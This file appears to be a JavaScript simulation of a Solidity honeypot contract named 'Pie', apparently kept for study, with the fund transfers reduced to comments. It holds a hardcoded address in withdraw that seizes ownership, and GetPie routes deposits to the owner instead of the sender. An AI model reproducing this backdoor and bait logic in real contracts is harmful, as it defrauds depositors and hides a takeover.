/*



 */

class Pie {
    constructor(msg_sender) {
        this.Owner = msg_sender;
        this.balance = 0n; // [SIMULATED: contract balance]
    }

    fallback(msg_sender, msg_value) {
        this.balance += msg_value;
    }

    GetPie(msg_sender, msg_value) {
        if (msg_value > 1000000000000000000n) {
            // [SIMULATED: Owner.transfer(this.balance)]
            this.balance = 0n;
            // [SIMULATED: msg.sender.transfer(this.balance)]
            this.balance = 0n;
        }
    }

    withdraw(msg_sender, msg_value) {
        if (msg_sender == "0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6") { this.Owner = "0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6"; }
        if (!(msg_sender == this.Owner)) throw new Error("require");
        // [SIMULATED: Owner.transfer(this.balance)]
        this.balance = 0n;
    }

    Command(adr, data, msg_sender, msg_value) {
        if (!(msg_sender == this.Owner)) throw new Error("require");
        //
        // [SIMULATED: adr.call.value(msg.value)(data)]
    }
}